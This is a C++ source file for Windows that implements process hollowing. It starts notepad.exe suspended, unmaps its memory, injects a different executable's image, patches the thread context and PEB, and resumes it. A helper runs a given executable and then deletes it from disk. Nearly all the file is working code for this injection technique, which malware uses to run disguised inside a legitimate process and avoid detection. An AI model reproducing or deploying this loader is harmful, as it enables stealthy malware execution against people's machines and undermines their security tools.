#include "LoadExe.h"
#include "Utility.h"

#pragma  warning(disable:4996) 

int ExeRunInMem(char* pExeFileName)
{
	if(NULL == pExeFileName)
		return -1;

	/*FILE* pf;
	if(  0 != fopen_s( &pf, pExeFileName, "r+b" ) )
		return -1;

	fseek(pf, 0, SEEK_END);
	long filesize = ftell(pf);
	fseek(pf, 0, SEEK_SET);

	char* pFileBuf = new char[filesize+1];
	if(NULL == pFileBuf)
		return -2;

	int nReadNum = fread(pFileBuf, sizeof(char), filesize, pf);

	TCHAR szPath[_MAX_PATH] = {0}; 
 	GetTempPath(_MAX_PATH,   szPath); 
// 	wcscat(szPath, TEXT("rft.exe"));
	wcscat(szPath, TEXT("mmt.jeb")); 

	int nTextLen = WideCharToMultiByte( CP_ACP, 0, szPath, -1, NULL, 0, NULL, NULL );
	char* szPathAnsi = new char[nTextLen + 1];
	memset((void*)szPathAnsi, 0, sizeof(char) * (nTextLen+1));
	WideCharToMultiByte( CP_ACP, 0, szPath, -1, szPathAnsi, nTextLen, NULL, NULL );

	FILE* pOldFile;
	if( 0 == fopen_s( &pOldFile, szPathAnsi, "r" ) )
	{
		fclose(pOldFile);
		DeleteFile(szPath);
	}

	delete[] szPathAnsi;
	szPathAnsi = NULL;

	HANDLE hfile = CreateFile(szPath, FILE_ALL_ACCESS, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_FLAG_RANDOM_ACCESS, NULL); 
	if(INVALID_HANDLE_VALUE == hfile)
	{
		delete[] pFileBuf;
		fclose(pf);

		CLOG Log;
		Log.Write("CreateFile failed");
		return -1;
	}

	DWORD dwBytesWritten;
	if(!WriteFile(hfile, pFileBuf, filesize, &dwBytesWritten, NULL))
	{
		delete[] pFileBuf;
		CloseHandle(hfile);
		fclose(pf);

		CLOG Log;
		Log.Write("WriteFile failed");
		return -1;
	}

	delete[] pFileBuf;
	fclose(pf);

	CloseHandle(hfile);*/

	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	ZeroMemory( &si, sizeof(si) );
	si.cb = sizeof(si);
	ZeroMemory( &pi, sizeof(pi) );

	if(CreateProcessA(NULL, pExeFileName, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
	{
		WaitForSingleObject(pi.hProcess, INFINITE);
		DeleteFileA(pExeFileName);	

		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
	else
	{
		CLOG Log;
		Log.Write("CreateProcess failed Error %d", GetLastError());
		DeleteFileA(pExeFileName);
		return -1;
	}

	return 0;
}

BOOL ReadPEInfo(FILE *fp, MZHeader *outMZ, PE_Header *outPE, PE_ExtHeader *outpeXH, SectionHeader **outSecHdr)
{
	long fileSize = FileLength(fp);

    if(fileSize < sizeof(MZHeader))
    {
        printf("File size too small\n");        
        return false;
    }

    MZHeader mzH;
    fread(&mzH, sizeof(MZHeader), 1, fp);

    if(mzH.signature != 0x5a4d)        // MZ
    {
        printf("File does not have MZ header\n");
        return false;
    }

    if((unsigned long)fileSize < mzH.offsetToPE + sizeof(PE_Header))
    {
        printf("File size too small\n");        
        return false;
    }

    fseek(fp, mzH.offsetToPE, SEEK_SET);
    PE_Header peH;
    fread(&peH, sizeof(PE_Header), 1, fp);

    if(peH.sizeOfOptionHeader != sizeof(PE_ExtHeader))
    {
        printf("Unexpected option header size.\n");
        
        return false;
    }

    PE_ExtHeader peXH;

    fread(&peXH, sizeof(PE_ExtHeader), 1, fp);

    SectionHeader *secHdr = new SectionHeader[peH.numSections];

    fread(secHdr, sizeof(SectionHeader) * peH.numSections, 1, fp);

    *outMZ = mzH;
    *outPE = peH;
    *outpeXH = peXH;
    *outSecHdr = secHdr;

    return true;
}

int CalcTotalImageSize(MZHeader *inMZ, PE_Header *inPE, PE_ExtHeader *inpeXH, SectionHeader *inSecHdr)
{
    int result = 0;
    int alignment = inpeXH->sectionAlignment;

    if(inpeXH->sizeOfHeaders % alignment == 0)
        result += inpeXH->sizeOfHeaders;
    else
    {
        int val = inpeXH->sizeOfHeaders / alignment;
        val++;
        result += (val * alignment);
    }

    for(int i = 0; i < inPE->numSections; i++)
    {
        if(inSecHdr[i].virtualSize)
        {
            if(inSecHdr[i].virtualSize % alignment == 0)
                result += inSecHdr[i].virtualSize;
            else
            {
                int val = inSecHdr[i].virtualSize / alignment;
                val++;
                result += (val * alignment);
            }
        }
    }

    return result;
}

unsigned long GetAlignedSize(unsigned long curSize, unsigned long alignment)
{    
    if(curSize % alignment == 0)
        return curSize;
    else
    {
        int val = curSize / alignment;
        val++;
        return (val * alignment);
    }
}

BOOL LoadPE(FILE *fp, MZHeader *inMZ, PE_Header *inPE, PE_ExtHeader *inpeXH, SectionHeader *inSecHdr, LPVOID ptrLoc)
{
    char *outPtr = (char *)ptrLoc;

    fseek(fp, 0, SEEK_SET);
    unsigned long headerSize = inpeXH->sizeOfHeaders;

	int i;
    for(i = 0; i < inPE->numSections; i++)
    {
        if(inSecHdr[i].pointerToRawData < headerSize)
            headerSize = inSecHdr[i].pointerToRawData;
    }

    unsigned long readSize = fread(outPtr, 1, headerSize, fp);
    if(readSize != headerSize)
    {
        printf("Error reading headers (%d %d)\n", readSize, headerSize);
        return false;        
    }

    outPtr += GetAlignedSize(inpeXH->sizeOfHeaders, inpeXH->sectionAlignment);

    for(i = 0; i < inPE->numSections; i++)
    {
        if(inSecHdr[i].sizeOfRawData > 0)
        {
            unsigned long toRead = inSecHdr[i].sizeOfRawData;
            if(toRead > inSecHdr[i].virtualSize)
                toRead = inSecHdr[i].virtualSize;

            fseek(fp, inSecHdr[i].pointerToRawData, SEEK_SET);
            readSize = fread(outPtr, 1, toRead, fp);

            if(readSize != toRead)
            {
                printf("Error reading section %d\n", i);
                return false;
            }
            outPtr += GetAlignedSize(inSecHdr[i].virtualSize, inpeXH->sectionAlignment);
        }
        else
        {
            if(inSecHdr[i].virtualSize)
                outPtr += GetAlignedSize(inSecHdr[i].virtualSize, inpeXH->sectionAlignment);
        }
    }

    return true;
}


struct FixupBlock
{
    unsigned long pageRVA;
    unsigned long blockSize;
};

void DoRelocation(MZHeader *inMZ, PE_Header *inPE, PE_ExtHeader *inpeXH, SectionHeader *inSecHdr, LPVOID ptrLoc, DWORD newBase)
{
    if(inpeXH->relocationTableAddress && inpeXH->relocationTableSize)
    {
        FixupBlock *fixBlk = (FixupBlock *)((char *)ptrLoc + inpeXH->relocationTableAddress);
        long delta = newBase - inpeXH->imageBase;

        while(fixBlk->blockSize)
        {
            int numEntries = (fixBlk->blockSize - sizeof(FixupBlock)) >> 1;

            unsigned short *offsetPtr = (unsigned short *)(fixBlk + 1);

            for(int i = 0; i < numEntries; i++)
            {
                DWORD *codeLoc = (DWORD *)((char *)ptrLoc + fixBlk->pageRVA + (*offsetPtr & 0x0FFF));
                
                int relocType = (*offsetPtr & 0xF000) >> 12;     

                if(relocType == 3)
                    *codeLoc = ((DWORD)*codeLoc) + delta;
                else
                {
                    printf("Unknown relocation type = %d\n", relocType);
                }
                offsetPtr++;
            }

            fixBlk = (FixupBlock *)offsetPtr;
        }
    }    
}

BOOL CreateChild(PPROCESS_INFORMATION pi, PCONTEXT ctx, PROCINFO *outChildProcInfo)
{
    STARTUPINFO si = {0};

	TCHAR pProc[] = TEXT("notepad.exe");
    //if(CreateProcess(NULL, (LPWSTR)TARGETPROC, NULL, NULL, 0, CREATE_SUSPENDED, NULL, NULL, &si, pi))        
	if(CreateProcess(NULL, pProc, NULL, NULL, 0, CREATE_SUSPENDED, NULL, NULL, &si, pi))        
    {
        ctx->ContextFlags=CONTEXT_FULL;
        GetThreadContext(pi->hThread, ctx);

        DWORD *pebInfo = (DWORD *)ctx->Ebx;
        DWORD read;
        ReadProcessMemory(pi->hProcess, &pebInfo[2], (LPVOID)&(outChildProcInfo->baseAddr), sizeof(DWORD), &read);
    
        DWORD curAddr = outChildProcInfo->baseAddr;
        MEMORY_BASIC_INFORMATION memInfo;
        while(VirtualQueryEx(pi->hProcess, (LPVOID)curAddr, &memInfo, sizeof(memInfo)))
        {
            if(memInfo.State == MEM_FREE)
                break;
            curAddr += memInfo.RegionSize;
        }
        outChildProcInfo->imageSize = (DWORD)curAddr - (DWORD)outChildProcInfo->baseAddr;

        return TRUE;
    }
    return FALSE;
}

BOOL HasRelocationTable(PE_ExtHeader *inpeXH)
{
    if(inpeXH->relocationTableAddress && inpeXH->relocationTableSize)
    {
        return TRUE;
    }
    return FALSE;
}

void DoFork(MZHeader *inMZ, PE_Header *inPE, PE_ExtHeader *inpeXH, SectionHeader *inSecHdr, LPVOID ptrLoc, DWORD imageSize)
{
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi;
    CONTEXT ctx;
    PROCINFO childInfo;
    
    if(CreateChild(&pi, &ctx, &childInfo)) 
    {        
        printf("Original EXE loaded (PID = %d).\n", pi.dwProcessId);
        printf("Original Base Addr = %X, Size = %X\n", childInfo.baseAddr, childInfo.imageSize);
        
        LPVOID v = (LPVOID)NULL;
        
        if(inpeXH->imageBase == childInfo.baseAddr && imageSize <= childInfo.imageSize)
        {
            v = (LPVOID)childInfo.baseAddr;
            DWORD oldProtect;
            VirtualProtectEx(pi.hProcess, (LPVOID)childInfo.baseAddr, childInfo.imageSize, PAGE_EXECUTE_READWRITE, &oldProtect);            
            
            printf("Using Existing Mem for New EXE at %X\n", (unsigned long)v);
        }
        else
        {
			PTRZwUnmapViewOfSection pZwUnmapViewOfSection = (PTRZwUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "ZwUnmapViewOfSection");

            if(pZwUnmapViewOfSection(pi.hProcess, (LPVOID)childInfo.baseAddr) == 0)
            {
                v = VirtualAllocEx(pi.hProcess, (LPVOID)inpeXH->imageBase, imageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                if(v)
                    printf("Unmapped and Allocated Mem for New EXE at %X\n", (unsigned long)v);
            }
        }

        if(!v && HasRelocationTable(inpeXH))
        {
            v = VirtualAllocEx(pi.hProcess, (void *)NULL, imageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            if(v)
            {
                printf("Allocated Mem for New EXE at %X. EXE will be relocated.\n", (unsigned long)v);

                DoRelocation(inMZ, inPE, inpeXH, inSecHdr, ptrLoc, (DWORD)v);
            }
        }
        
        if(v)
        {            
            printf("New EXE Image Size = %X\n", imageSize);
            
            DWORD *pebInfo = (DWORD *)ctx.Ebx;
            DWORD wrote;                        
            WriteProcessMemory(pi.hProcess, &pebInfo[2], &v, sizeof(DWORD), &wrote);

            PE_ExtHeader *peXH = (PE_ExtHeader *)((DWORD)inMZ->offsetToPE + sizeof(PE_Header) + (DWORD)ptrLoc);
            peXH->imageBase = (DWORD)v;
            
            if(WriteProcessMemory(pi.hProcess, v, ptrLoc, imageSize, NULL))
            {    
                printf("New EXE image injected into process.\n");

                ctx.ContextFlags=CONTEXT_FULL;                
                
                if((DWORD)v == childInfo.baseAddr)
                {
                    ctx.Eax = (DWORD)inpeXH->imageBase + inpeXH->addressOfEntryPoint;    
                }
                else
                {
                    ctx.Eax = (DWORD)v + inpeXH->addressOfEntryPoint;  
                }


                SetThreadContext(pi.hThread,&ctx);

                DWORD ret = ResumeThread(pi.hThread);
                printf("Process resumed (PID = %d).\n", pi.dwProcessId);
            }
            else
            {
                printf("WriteProcessMemory failed\n");
                TerminateProcess(pi.hProcess, 0);
            }
        }
        else
        {
            printf("Load failed.  Consider making this EXE relocatable.\n");
            TerminateProcess(pi.hProcess, 0);
        }
    }
    else
    {
        printf("Cannot load %s\n", TARGETPROC);
    }
}